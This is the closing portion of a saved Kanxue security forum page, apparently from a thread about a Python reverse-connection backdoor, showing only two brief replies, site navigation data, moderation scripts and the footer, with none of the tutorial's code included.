								<span class="group group-105 mr-1" data-gid="105" onmouseenter="show_level(event)"></span>
							</div>
							<div class="text-grey text-tiny" style="height: 20px; text-align: center; margin-top: -9px; ">
								
								<!--注册：2015-1 <br>
								帖子：7 <br>-->
<!-- 
								 -->
								<div class="mb-3" style="position: relative;"><img style="position:absolute;left: -3px;" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/stars02.gif" alt=""> </div>
								<!--<span class="hidden-sm hidden-md" title=""></span>
								-->

							</div>
							
							
						</td>
						<td class="px-0">
							<dl class="row small">
								<dt>
									
									
									<div>
									<span class="username font-weight-bold">
										<a href="https://bbs.pediy.com/user-665727.htm">一壶葱茜</a>
									</span>
									
																		<span class="post_online_time" data-online_time="58966" data-desc="在线时长: 16 小时 ( 1 级)&lt;br/&gt; 升级还需要 7 小时" onmouseenter="show_online_level(event)"><img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/star.gif" width="13" height="13" style="opacity: 0.65; margin-right: 2px;"></span>
									<span class="date text-grey small ml-1">2018-2-23 09:30</span>
									</div>
									
								</dt>
								<dd class="text-right text-grey py-1">
									<div class="check_input_box d-inline-block"></div>
									<div class=" d-none d-lg-inline-block">
																													
																				
										

																			
										

	

																				
																			</div>
																		<a href="https://bbs.pediy.com/thread-224228-1.htm#1516642" id="1516642" class="text-grey mr-3"><span class="floor">4</span> 楼</a>
																			<div class="reply_thumb" style="display: inline-block;">
		<input type="hidden" value="224228" name="threadid">
		<input type="hidden" value="665727" name="praised_uid">
		<input type="hidden" value="1516642" name="pid">
		<a href="javascript:void(0)" class="text-grey">
						<i class="icon-thumbs-o-up"></i>
					</a>
		<span class="thumb_num" style="margin-left:5px">0</span>
	</div>
									<style>
										.mobile_more_operate_btn {
											padding: 0px 4px; 
											background: #dee5ea; 
											border-radius: 0.2rem; 
											cursor: pointer;
										}
										.mobile_more_operate {
											display: none; 
											left: -195px; 
											top: -13px; 
											width: 185px; 
											background: #222222; 
											border-radius: 0.3rem;
										}
										.mobile_more_operate_box .post_report {
											color: #fff!important;
										}
									</style>
										
								</dd>
							</dl>
							<!-- <div></div> -->
							<div class="message mt-1 break-all">
																								给力啊学习了								
																																
								
							</div>
						</td>
					</tr>
																			
										
										
					<tr class="post" data-pid="1528783">
						<td class="vtop td-avatar text-center" style="width: 46px;">
							<a href="https://bbs.pediy.com/user-790075.htm" tabindex="-1">
								<img class="avatar-3" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/790075.png">
							</a>
							<div class="mt-2">
								<span class="group group-102 mr-1" data-gid="102" onmouseenter="show_level(event)"></span>
							</div>
							<div class="text-grey text-tiny" style="height: 20px; text-align: center; margin-top: -9px; ">
								
								<!--注册：2018-2 <br>
								帖子：1 <br>-->
<!-- 
								 -->
								<div class="mb-3" style="position: relative;"><img style="position:absolute;left: -3px;" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/stars01.gif" alt=""> </div>
								<!--<span class="hidden-sm hidden-md" title=""></span>
								-->

							</div>
							
							
						</td>
						<td class="px-0">
							<dl class="row small">
								<dt>
									
									
									<div>
									<span class="username font-weight-bold">
										<a href="https://bbs.pediy.com/user-790075.htm">wx_工藤胖一</a>
									</span>
									
																		<span class="post_online_time" data-online_time="20700" data-desc="在线时长: 5 小时 ( 0 级)&lt;br/&gt; 升级还需要 4 小时" onmouseenter="show_online_level(event)"><img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/star_0.gif" width="13" height="13" style="opacity: 0.65; margin-right: 2px;"></span>
									<span class="date text-grey small ml-1">2018-5-4 15:36</span>
									</div>
									
								</dt>
								<dd class="text-right text-grey py-1">
									<div class="check_input_box d-inline-block"></div>
									<div class=" d-none d-lg-inline-block">
																													
																				
										

																			
										

	

																				
																			</div>
																		<a href="https://bbs.pediy.com/thread-224228-1.htm#1528783" id="1528783" class="text-grey mr-3"><span class="floor">5</span> 楼</a>
																			<div class="reply_thumb" style="display: inline-block;">
		<input type="hidden" value="224228" name="threadid">
		<input type="hidden" value="790075" name="praised_uid">
		<input type="hidden" value="1528783" name="pid">
		<a href="javascript:void(0)" class="text-grey">
						<i class="icon-thumbs-o-up"></i>
					</a>
		<span class="thumb_num" style="margin-left:5px">0</span>
	</div>
									<style>
										.mobile_more_operate_btn {
											padding: 0px 4px; 
											background: #dee5ea; 
											border-radius: 0.2rem; 
											cursor: pointer;
										}
										.mobile_more_operate {
											display: none; 
											left: -195px; 
											top: -13px; 
											width: 185px; 
											background: #222222; 
											border-radius: 0.3rem;
										}
										.mobile_more_operate_box .post_report {
											color: #fff!important;
										}
									</style>
										
								</dd>
							</dl>
							<!-- <div></div> -->
							<div class="message mt-1 break-all">
																								可是问题在于你怎么把这个客户端脚本放到被攻击的服务器上并执行？？？？								
																																
								
							</div>
						</td>
					</tr>
								
										
													<tr class="post">
								<td class="td-avatar" aria-hidden="true">
									<a href="https://bbs.pediy.com/user-705338.htm" aria-hidden="true" tabindex="-1">
										<img class="avatar-3" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/avatar.png">
									</a>
								</td>
								<td class="p-l-0">
									<form action="https://bbs.pediy.com/thread-224228.htm" method="post" id="quick_reply_form">	
										
										<dl class="row small text-muted">
											<dt class="username">游客</dt>
											<dd class="text-right text-grey"></dd>
										</dl>
										<div class="message mt-1">
											<div style=" border-radius: 0.25rem; border: 1px solid #ced4da;">
												<div class="text-center small py-3">
													<a href="https://passport.kanxue.com/user-login.htm" class="small">登录</a>&nbsp;|&nbsp;<a href="https://passport.kanxue.com/user-mobile.htm" class="small">注册</a>&nbsp;方可回帖
												</div>
											</div>
										</div>
										<div class="text-muted  mt-2 small face_open">
											<dl class="row">
												<dt>
													<a class="btn btn-primary btn-sm" href="https://passport.kanxue.com/user-login.htm" role="button">　回帖　</a>
													
													<span class="emotion ml-3">表情</span>
													<span class="ml-3 d-none d-lg-inline-block"><a href="https://bbs.pediy.com/thread-247709.htm" target="_bank" style="color: #0099ee;">雪币赚取及消费</a></span>
												</dt>
												<dd class="text-right vtop">
													
													<a class="icon-mail-forward text-muted" href="https://passport.kanxue.com/user-login.htm" id="advanced_reply"> 高级回复</a>
													
												</dd>
											</dl>
										</div>
									</form>
								</td>
							</tr>
											</tbody>
				</table>
			</div>
		</div>
		
		
				
		
		
				
				
		<a role="button" class="btn btn-secondary btn-block xn-back my-3 mx-auto" style="max-width: 50%;" href="javascript:history.back();">返回</a>
		
		<br>
		<br>
		

		
		</div>

	</main>

	
	<footer id="footer" style="background: #3b4348; color: #9ba4aa; height: auto;">
		<div class="container">
			<div class="row text-muted small my-3 mx-0" id="web_base_company_information">
				<div class="col-md-6">
					©2000-2019 看雪学院 | Based on <a href="http://bbs.xiuno.com/" target="_blank" class="text-muted">Xiuno BBS</a> <br>
					域名：<a href="https://www.yunaq.com/" target="_blank" class="text-muted">加速乐</a> | 
					SSL证书：<a href="https://www.trustasia.com/trustasia" target="_blank" class="text-muted">亚洲诚信</a> | 
					<a href="http://dun.163.com/?from=kanxue_DDoS_2018&amp;hmsr=kanxue%C2%A0" target="_blank" class="text-muted">安全网易云易盾</a>
					<span class="hidden-sm"> | 公众号：ikanxue</span> 
				</div>
				<div class="col-md-6 text-right d-none d-md-block">
					<a class="text-muted" href="https://zhuanlan.kanxue.com/article-56.htm">关于我们</a> | 
					<a class="text-muted" href="https://www.kanxue.com/user-online_sendmsg.htm">联系我们</a> | 
					<a href="https://zhuanlan.kanxue.com/article-1.htm" class="text-muted">企业服务</a> <br>
					Processed: <b>0.332</b>s, SQL: <b>25</b> / 京ICP备10040895号-17
				</div>
			</div>
			<div style="max-height: 100px; overflow-y:auto;">
							</div>
		</div>
	</footer>
	


	<!--[if lt IE 9]>
	<script>window.location = 'browser.htm';</script>
	<![endif]-->


	

	<div class="act_go_top" style="position: fixed; bottom: 80px; right: 10px; width: 70px; height: 70px; display: none;">
	<a href="javascript:void(0);" style="width: 70px; height: 70px; display: inline-block;background: url(/view/img/scroll_top.png) no-repeat; _background: url(/view/img/scroll_top.png) no-repeat; outline: none;" title="返回顶部"></a>
	</div>




<script src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/bbs.js.下载"></script>
<script src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/jquery-3.1.0.js.下载"></script>
<script src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/popper.js.下载"></script>
<script src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/bootstrap.js.下载"></script>
<script src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/xiuno.js.下载"></script>
<script src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/storagePlus.js.下载"></script>
<script src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/bootstrap-plugin.js.下载"></script><script language="javascript" src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/layer.js.下载"></script>
<script src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/async.js.下载"></script>
<script src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/form.js.下载"></script>

<script>
// 用于个人中心 判断路由 center ，还是 pm
var sele_route = 'thread';
var sele_action = '224228';

var debug = DEBUG = 0;
var url_rewrite_on = 1;
var forumarr = {
    "4": "『软件逆向』",
    "52": "OllyDbg插件收集区",
    "69": "『经典问答』",
    "102": "『科锐培训』",
    "141": "CrackMe存档区",
    "152": "学习园地",
    "2": "『论坛版务』",
    "53": "IDA Pro插件收集区",
    "76": "1)珠海金山2007逆向分析挑战",
    "99": "《加密与解密(第4版)》",
    "169": "『15PB培训』",
    "125": "奇虎360软件安全大赛答案提交区",
    "128": "『智能设备』",
    "21": "《软件加密技术内幕》",
    "68": "2)PEDIY Crackme竞",
    "41": "『编程技术』",
    "79": "前沿科技",
    "95": "《0day:软件漏洞分析技术》",
    "160": "『麦洛科菲培训』",
    "161": "『Android安全』",
    "166": "『iOS安全』",
    "88": "『加壳脱壳』",
    "91": "3)看雪论坛2008 Explo",
    "158": "移动平台",
    "3": "桌面平台",
    "120": "4)腾讯公司2008软件安全竞赛",
    "132": "『密码算法』",
    "123": "《微软.NET程序的加密与解密》",
    "127": "5)奇虎360软件安全比赛",
    "37": "『CrackMe』",
    "140": "6)PEDIY Crackme竞",
    "108": "企业建设",
    "65": "『图书项目』",
    "150": "『二进制漏洞』",
    "163": "《C++反汇编与逆向分析技术》",
    "10": "『工具下载』",
    "116": "看雪CTF",
    "155": "8)腾讯公司2010软件安全竞赛",
    "168": "《Android安全与逆向分析》",
    "157": "9)2011 Exploit M",
    "121": "11）移动安全挑战赛（MSC）",
    "129": "12）2015第2届移动安全挑战",
    "136": "职场生活",
    "47": "『招聘专区』",
    "1": "站务管理/产品",
    "97": "『求助问答』",
    "137": "『职业生涯』",
    "171": "『Pwn』",
    "45": "『茶余饭后』",
    "162": "『业务安全』",
    "20": "『¥付费问答』",
    "32": "『外文翻译』",
    "151": "『WEB安全』",
    "172": "『区块链安全』"
};
var fid = 32;
var uid = 0;
var gid = 0;
$('[data-toggle="tooltip"]').tooltip();
$('#search_form > input').on('click', function() {
	return false;
});
</script>

<script src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/bbs.js(1).下载"></script>

<script>
// 版主管理：精华
$('.mod-button button.digest').on('click', function() {
	var modtid = $('input[name="modtid"]').checked();
	if(modtid.length == 0) return $.alert(lang.please_choose_thread);
	var radios = xn.form_radio('digest', {"0": "取消精华", "1": "关注","2": "优秀", "3": "精华"});
	$.confirm("设置主题为精华", function() {
		var tids = xn.implode('_', modtid);
		var digest = $('input[name="digest"]').checked();
		var postdata = {digest: digest};
		$.xpost(xn.url('mod-digest-'+tids), postdata, function(code, message) {
			if(code != 0) return $.alert(message);
			$.alert(message).delay(1000).location('');
		});
	}, {'body': '<p>'+"精华等级"+'：'+radios+'</p>'});
})
</script><script>
function xn_read_unread(tids, tid) {
	
	// 当前时间
	var time = xn.time();
	
	// 多长时间内的主题为最新主题
	var time_range = 86400 * 3;
	
	// 三天内的 tids
	var recent_tids = $.pdata('recent_tids') || {};
	
	// 已读的 tids
	var view_tids = $.pdata('view_tids') || {};
	// 提取列表页的 tid
	function fetch_recent_tids(tids) {
		var changed = false;
		$.each(tids, function(tid, last_date) {
			if(time - last_date < time_range) {
				recent_tids[tid] = last_date;
				changed = true;
			}
		});
		if(changed) $.pdata('recent_tids', recent_tids);
	}
	
	// 清理最近的 tid
	function gc_recent_tids() {
		var changed = false;
		$.each(recent_tids, function(tid, last_date) {
			if(time - last_date > time_range) {
				delete recent_tids[tid];
				changed = true;
			}
		});
		if(changed) $.pdata('recent_tids', recent_tids);
	}
	
	function gc_view_tids() {
		var changed = false;
		$.each(view_tids, function(tid, last_date) {
			if(!recent_tids[tid]) {
				delete view_tids[tid];
				changed = true;
			}
		});
		if(changed) $.pdata('view_tids', view_tids);
	}
	
	function save_view_tid(tid) {
		if(!recent_tids[tid]) return;
		view_tids[tid] = time;
		$.pdata('view_tids', view_tids);
	}
	
	if(tids) {
		fetch_recent_tids(tids);
		gc_recent_tids();
		//gc_view_tids();
	}
	if(tid) save_view_tid(tid);
	
	// 三天内的主题标记为已读
	
	// 遍历主题列表，标记最近的，并且未读的为加粗

	$('.thread').each(function() {
		var jthis = $(this);
		var tid = jthis.attr('tid') || jthis.data('tid');
		if(recent_tids[tid] && recent_tids[tid] > xn.intval(view_tids[tid])) {
			//jthis.find('div.subject').addClass('font-weight-bold');
			jthis.find('div.subject').append('<span class="icon-new"></span>');
			jthis.find('span.icon-post-grey').removeClass('icon-post-grey').addClass('icon-post-blue');
		}
	});
}

</script>

<script type="text/javascript">
$(function() {
	setTimeout(function() {
		$.require('https://www.google-analytics.com/ga.js', function() {
			try {
				var pageTracker = _gat._getTracker("UA-9784446-1");
				pageTracker._trackPageview();
			} catch (err) {}
		});
	}, 1000);

	setTimeout(function() {
		$(".bbs_home_page_three_col .small_logo").each(function(index, element) {

			if ($(element).children("a").length == 0) {
				$(".bbs_home_page_three_col .bbs_home_page_row_div").eq(index).children('div:first-child').removeClass("col-lg-8").addClass("col-lg-9");
				$(".bbs_home_page_three_col .bbs_home_page_row_div").eq(index).children('div:last-child').removeClass("col-lg-4").addClass("col-lg-3");
				$(".bbs_home_page_three_col .bbs_home_page_row_div").eq(index).children('div:first-child').children("span").css("width", "19rem");
			}
		})
	}, 2000);


	if (self != top) {
		$('#header').hide();
		$('#nav2').hide();
		$('#footer').hide();
	}


	 // 导航
    var new_p = 0, start_scrollTop = 0;
        $(window).scroll(function(e){  
                new_p = $(this).scrollTop();  
                  
                if(start_scrollTop < new_p) {//下滚  
                    $('.header_fiexd').css("display","none");
                } else {//上滚  
                    $('.header_fiexd').css("display","block");
                }  
                setTimeout(function(){start_scrollTop = new_p;},0);         
        });

	
	// 返回顶部
	$(window).scroll(function() {
		if ($(window).scrollTop() >= 500) {
			$('.act_go_top').fadeIn(300);
		} else {
			$('.act_go_top').fadeOut(300);
		}
	});

	$('.act_go_top').click(function() {
		$('html,body').animate({
			scrollTop: '0px'
		}, 100);
	});
	var m1 = 0;     // 滚动的值
	var m2 = 0;     // 对比时间的值
	var timer = null;
	document.onscroll = function() {
		clearTimeout(timer) // 每次滚动前 清除一次
		timer = setTimeout(Data, 2000);
		m1 = document.documentElement.scrollTop || document.body.scrollTop;

	}
	function Data() {
		m2 = document.documentElement.scrollTop || document.body.scrollTop;
		if(m2 == m1){
		    $('.act_go_top').fadeOut(300);
		}
	}

});


</script>

<script>
(function() {
	var islogin = '0';
	if(islogin == 0)  return; 
	var pm_number = "//www.kanxue.com/pm-new.htm";
	$.xget(pm_number, function(code, message) {
		var pm_number = $(".pm_number");
		var sysm_number = $(".system_message_number");
		if (code == 0) {
			var newpms = parseInt(message.newpms);
			var system_pms = parseInt(message.system_pms);
			var pm_total = newpms + system_pms;
			if (pm_total != 0) {
				pm_total = pm_total > 99 ? "99+" : pm_total;
				$(".pm_total").html(pm_total);
				// $(".pm_total").css({
				// 	"display": "inline-block",
				// 	"padding": "0px 7px",
				// 	"font-size": "12px",
				// 	"line-height": "20px",
				// 	"color": "white",
				// 	"background-color": "#f57e42",
				// 	"border-radius": "9px",
				// 	"text-indent": "0px"
				// });

				if (system_pms > 0 && newpms == 0) {
					var href = "//www.kanxue.com/pm-system_read-1.htm";
					$(".pm_total_a").attr("href", href);
				}

			} else {
				// $(".pm_total_a").css("display","none");
			};
			if (message.newpms != 0) {
				pm_number.html(message.newpms);
				pm_number.addClass("pmmessage_number");
			} else {
				pm_number.css("display", "none");
			};
			if (message.system_pms != 0) {
				sysm_number.html(message.system_pms);
				sysm_number.addClass("pmmessage_number");
			} else {
				sysm_number.css("display", "none");
			};
			if (message.newpms != 0) {
				pm_number.html(message.newpms);
				pm_number.addClass("pm_numbers_");
			} else {
				pm_number.css("display", "none");
			};
			if (message.system_pms != 0) {
				sysm_number.html(message.system_pms);
				sysm_number.addClass("pm_numbers_");
			} else {
				sysm_number.css("display", "none");
			};


		} else {
			// $(".pm_total").css({
			// 	"display": "inline-block",
			// 	"padding": "0px 3px",
			// 	"font-size": "12px",
			// 	"line-height": "20px",
			// 	"color": "white",
			// 	"background-color": "#f57e42",
			// 	"border-radius": "9px",
			// 	"text-indent": "0px"
			// });
			pm_number.css("display", "none");
			sysm_number.css("display", "none");

		}
	})

})(jQuery);
</script>
<script>
	//统计在线

	(function() {

		var uid = '0';
		var current_time = '1560096944';
		
		var last_time;
		if(uid > 0) {
			//10分钟以内不请求。
			last_time = storagePlus.get('last_active_time_'+uid) || 0;
			//大于5分钟请求接口。
			if((current_time - last_time)/60 > 5) {
				$.xpost('user-online_sumtime.htm',{}, function(code, msg) {
					if(code == 0) {
						storagePlus.set('last_active_time_'+uid, msg);
					} else {
						console.info('msg');
					}
				});
			}
		}



	})();

	


</script>
<script>

var forumlist = [
    {
        "fid": "4",
        "fup": "3",
        "name": "『软件逆向』",
        "rank": "29"
    },
    {
        "fid": "29",
        "fup": "2",
        "name": "『论坛管理团队』",
        "rank": "29"
    },
    {
        "fid": "52",
        "fup": "10",
        "name": "OllyDbg插件收集区",
        "rank": "29"
    },
    {
        "fid": "69",
        "fup": "20",
        "name": "『经典问答』",
        "rank": "29"
    },
    {
        "fid": "122",
        "fup": "37",
        "name": "CTF2019提交区(隐藏版块)",
        "rank": "29"
    },
    {
        "fid": "102",
        "fup": "137",
        "name": "『科锐培训』",
        "rank": "29"
    },
    {
        "fid": "141",
        "fup": "140",
        "name": "CrackMe存档区",
        "rank": "29"
    },
    {
        "fid": "152",
        "fup": "0",
        "name": "学习园地",
        "rank": "29"
    },
    {
        "fid": "2",
        "fup": "1",
        "name": "『论坛版务』",
        "rank": "28"
    },
    {
        "fid": "53",
        "fup": "10",
        "name": "IDA Pro插件收集区",
        "rank": "28"
    },
    {
        "fid": "76",
        "fup": "37",
        "name": "1)珠海金山2007逆向分析挑战",
        "rank": "28"
    },
    {
        "fid": "99",
        "fup": "65",
        "name": "《加密与解密(第4版)》",
        "rank": "28"
    },
    {
        "fid": "169",
        "fup": "137",
        "name": "『15PB培训』",
        "rank": "28"
    },
    {
        "fid": "125",
        "fup": "127",
        "name": "奇虎360软件安全大赛答案提交区",
        "rank": "28"
    },
    {
        "fid": "128",
        "fup": "79",
        "name": "『智能设备』",
        "rank": "27"
    },
    {
        "fid": "21",
        "fup": "57",
        "name": "《软件加密技术内幕》",
        "rank": "27"
    },
    {
        "fid": "68",
        "fup": "37",
        "name": "2)PEDIY Crackme竞",
        "rank": "27"
    },
    {
        "fid": "41",
        "fup": "3",
        "name": "『编程技术』",
        "rank": "27"
    },
    {
        "fid": "79",
        "fup": "0",
        "name": "前沿科技",
        "rank": "27"
    },
    {
        "fid": "78",
        "fup": "2",
        "name": "『申请提交区』",
        "rank": "27"
    },
    {
        "fid": "95",
        "fup": "65",
        "name": "《0day:软件漏洞分析技术》",
        "rank": "27"
    },
    {
        "fid": "160",
        "fup": "137",
        "name": "『麦洛科菲培训』",
        "rank": "27"
    },
    {
        "fid": "161",
        "fup": "158",
        "name": "『Android安全』",
        "rank": "27"
    },
    {
        "fid": "166",
        "fup": "158",
        "name": "『iOS安全』",
        "rank": "27"
    },
    {
        "fid": "88",
        "fup": "3",
        "name": "『加壳脱壳』",
        "rank": "26"
    },
    {
        "fid": "91",
        "fup": "37",
        "name": "3)看雪论坛2008 Explo",
        "rank": "26"
    },
    {
        "fid": "158",
        "fup": "0",
        "name": "移动平台",
        "rank": "26"
    },
    {
        "fid": "3",
        "fup": "0",
        "name": "桌面平台",
        "rank": "25"
    },
    {
        "fid": "120",
        "fup": "37",
        "name": "4)腾讯公司2008软件安全竞赛",
        "rank": "25"
    },
    {
        "fid": "57",
        "fup": "2",
        "name": "『回收站』",
        "rank": "25"
    },
    {
        "fid": "132",
        "fup": "3",
        "name": "『密码算法』",
        "rank": "24"
    },
    {
        "fid": "123",
        "fup": "57",
        "name": "《微软.NET程序的加密与解密》",
        "rank": "24"
    },
    {
        "fid": "127",
        "fup": "37",
        "name": "5)奇虎360软件安全比赛",
        "rank": "24"
    },
    {
        "fid": "37",
        "fup": "116",
        "name": "『CrackMe』",
        "rank": "23"
    },
    {
        "fid": "140",
        "fup": "37",
        "name": "6)PEDIY Crackme竞",
        "rank": "23"
    },
    {
        "fid": "108",
        "fup": "0",
        "name": "企业建设",
        "rank": "22"
    },
    {
        "fid": "65",
        "fup": "1",
        "name": "『图书项目』",
        "rank": "22"
    },
    {
        "fid": "150",
        "fup": "3",
        "name": "『二进制漏洞』",
        "rank": "22"
    },
    {
        "fid": "163",
        "fup": "65",
        "name": "《C++反汇编与逆向分析技术》",
        "rank": "22"
    },
    {
        "fid": "10",
        "fup": "3",
        "name": "『工具下载』",
        "rank": "21"
    },
    {
        "fid": "116",
        "fup": "0",
        "name": "看雪CTF",
        "rank": "21"
    },
    {
        "fid": "155",
        "fup": "37",
        "name": "8)腾讯公司2010软件安全竞赛",
        "rank": "21"
    },
    {
        "fid": "168",
        "fup": "65",
        "name": "《Android安全与逆向分析》",
        "rank": "21"
    },
    {
        "fid": "157",
        "fup": "37",
        "name": "9)2011 Exploit M",
        "rank": "20"
    },
    {
        "fid": "121",
        "fup": "37",
        "name": "11）移动安全挑战赛（MSC）",
        "rank": "18"
    },
    {
        "fid": "129",
        "fup": "37",
        "name": "12）2015第2届移动安全挑战",
        "rank": "17"
    },
    {
        "fid": "136",
        "fup": "0",
        "name": "职场生活",
        "rank": "12"
    },
    {
        "fid": "47",
        "fup": "136",
        "name": "『招聘专区』",
        "rank": "4"
    },
    {
        "fid": "1",
        "fup": "0",
        "name": "站务管理/产品",
        "rank": "3"
    },
    {
        "fid": "97",
        "fup": "20",
        "name": "『求助问答』",
        "rank": "3"
    },
    {
        "fid": "137",
        "fup": "136",
        "name": "『职业生涯』",
        "rank": "3"
    },
    {
        "fid": "171",
        "fup": "116",
        "name": "『Pwn』",
        "rank": "2"
    },
    {
        "fid": "45",
        "fup": "136",
        "name": "『茶余饭后』",
        "rank": "2"
    },
    {
        "fid": "162",
        "fup": "108",
        "name": "『业务安全』",
        "rank": "2"
    },
    {
        "fid": "170",
        "fup": "57",
        "name": "看雪产品",
        "rank": "2"
    },
    {
        "fid": "20",
        "fup": "152",
        "name": "『¥付费问答』",
        "rank": "1"
    },
    {
        "fid": "32",
        "fup": "152",
        "name": "『外文翻译』",
        "rank": "1"
    },
    {
        "fid": "64",
        "fup": "136",
        "name": "『会员专区』",
        "rank": "1"
    },
    {
        "fid": "151",
        "fup": "108",
        "name": "『WEB安全』",
        "rank": "1"
    },
    {
        "fid": "172",
        "fup": "79",
        "name": "『区块链安全』",
        "rank": "0"
    }
];

// 三级版块
function forum_tree(forumlist, template) {
	var template = template || '<option value="{fid}">{tab}{name}</option>'+"\r\n";
	var s = '';
	var forumlist1 = forumlist.filter(function(v) {return v.fup == 0});
	for(var i1=0; i1<forumlist1.length; i1++) {
		var v1 = forumlist1[i1];
		s += '►'+xn.template(template, {fid: v1.fid, name: v1.name, tab: "　"});
		var forumlist2 = forumlist.filter(function(v2) {return v2.fup == v1.fid});
		for(var i2=0; i2<forumlist2.length; i2++) {
			var v2 = forumlist2[i2];
			s += xn.template(template, {fid: v2.fid, name: v2.name, tab: "　　"});
			var forumlist3 = forumlist.filter(function(v3) {return v3.fup == v2.fid});
			for(var i3=0; i3<forumlist3.length; i3++) {
				var v3 = forumlist3[i3];
				s += xn.template(template, {fid: v3.fid, name: v3.name, tab: "　　　　"});
			}

		}
	}
	return s;
}


// 版主管理：移动 / moderator : move
$('.mod-button button.move').off('click').on('click', function() {
	var modtid = $('input[name="modtid"]').checked();
	if(modtid.length == 0) return $.alert(lang.please_choose_thread);
	var select = '<select name="fid">'+forum_tree(forumlist)+'</select>';
	$.confirm(lang.move_forum, function() {
		var tids = xn.implode('_', modtid);
		var newfid = $('select[name="fid"]').val();
		$.xpost(xn.url('mod-move-'+tids+'-'+newfid), function(code, message) {
			if(code != 0) return $.alert(message);
			$.alert(message).delay(1000).location('');
		});
	}, {'body': '<p>'+lang.choose_move_forum+'：'+select+'</p>'});
})

</script><script>

// 版主管理：审核
$('.mod-button button.audit').on('click', function() {
	var modtid = $('input[name="modtid"]').checked();
	if(modtid.length == 0) return $.alert(lang.please_choose_thread);
	var radios = xn.form_radio('audit', {"1": "审核通过", "2": "审核不通过"});
	$.confirm('审核主题', function() {
		var tids = xn.implode('_', modtid);
		var audit = $('input[name="audit"]').checked();
		var postdata = {audit: audit};
		$.xpost(xn.url('mod-audit-'+tids), postdata, function(code, message) {
			if(code != 0) return $.alert(message);
			$.alert(message).delay(1000).location('');
		});
	}, {'body': '<p>'+'审核选项'+'：'+radios+'</p>'});
})

</script>
<script>

$(function() {
	// 版主管理：删除 / moderator : delete
	$('.mod-button button.delete').off('click').on('click', function() {
		var modtid = $('input[name="modtid"]').checked();
		if(modtid.length == 0) return $.alert(lang.please_choose_thread);
		var radios = '';
				//var htmladd = '<br><br><label class="text-small"><input type="checkbox" name="logic" value="0" /> 物理删除</label>';
		//htmladd += '<br><label class="text-small"><input type="checkbox" name="logic" value="0" /> 恢复删除</label>';
		$.confirm(xn.lang('confirm_delete_thread', {n:modtid.length}) + '<br><br>'+radios, function() {
			var tids = xn.implode('_', modtid);
			var type = $('input[name="type"]').checked();
			$.xpost(xn.url('mod-delete-'+tids), {type: type}, function(code, message) {
				if(code != 0) return $.alert(message);
				$.alert(message).delay(1000).location('');
			});
		});
	})

	// 恢复逻辑删除的帖子
	$('body').on('click', '.post_recover', function() {
		var jthis = $(this);
		var href = jthis.data('href');
		var isfirst = jthis.attr('isfirst');
		if(window.confirm('确定恢复删除的帖子？')) {
			$.xpost(href, function(code, message) {
				var isfirst = jthis.attr('isfirst');
				if(code == 0) {
					if(isfirst == '1') {
						$.location('forum-32.htm');
					} else {
						window.location.reload();
					}
				} else {
					$.alert(message);
				}
			});
		}
		return false;
	});

})

</script>

<div class="modal fade appeal" id="appeal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
                <div class="modal-content">
                        <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                <span aria-hidden="true">×</span>
                        </button>
                        <h4 class="modal-title" id="exampleModalLabel">求助问答申诉</h4>
                        </div>
                        <form id="form_appeal" action="https://bbs.pediy.com/post-appeal.htm" method="post">
	                        <div class="modal-body">
	                                <div class="form-group">
	                                	<input id="pid" name="pid" value="0" type="hidden">
	                                        <textarea class="form-control" id="brief" name="brief" rows="6" placeholder="请填写内容，注意: 请写明申诉的原因"></textarea>
	                                </div>
	                        </div>
	                        <div class="modal-footer">
	                                <button id="appeal_submit" type="button" class="btn btn-primary" data-loading-text="正在提交...">申请提交</button>
	                        </div>
	                </form>
                </div>
        </div>
</div><div class="modal fade report" id="report" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
                <div class="modal-content">
                        <div class="modal-header">
                       
                        <h4 class="modal-title" id="exampleModalLabel">举报此帖</h4>
                         <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                <span aria-hidden="true">×</span>
                        </button>
                        </div>
                        <form id="form_report" action="https://bbs.pediy.com/post-report.htm" method="post">
                                <div class="modal-body">
                                        <div class="form-group">
                                                <input id="tid" name="tid" value="0" type="hidden">
                                                <input id="pid" name="pid" value="0" type="hidden">
                                                <textarea class="form-control" id="brief" name="brief" rows="6" placeholder="请填写内容，注意: 请确认您所举报此帖的内容涉及到语言挑衅和违犯论坛版规的内容， 版主将收到举报后审核该帖！"></textarea>
                                        </div>
                                </div>
                                <div class="modal-footer">
                                        <button id="report_submit" type="button" class="btn btn-primary" data-loading-text="正在提交...">发送报告</button>
                                </div>
                        </form>
                </div>
        </div>
</div>

<script src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/face.js.下载"></script>
<script src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/qqLevel.js.下载"></script>
<script>
var passport_domain = 'passport.kanxue.com';
// 回复 操作按钮 手机端 显示隐藏方法 开始
function mobile_more_operate(e){
	$(".mobile_more_operate").hide();
	$(e.target).siblings(".mobile_more_operate").fadeIn();
}
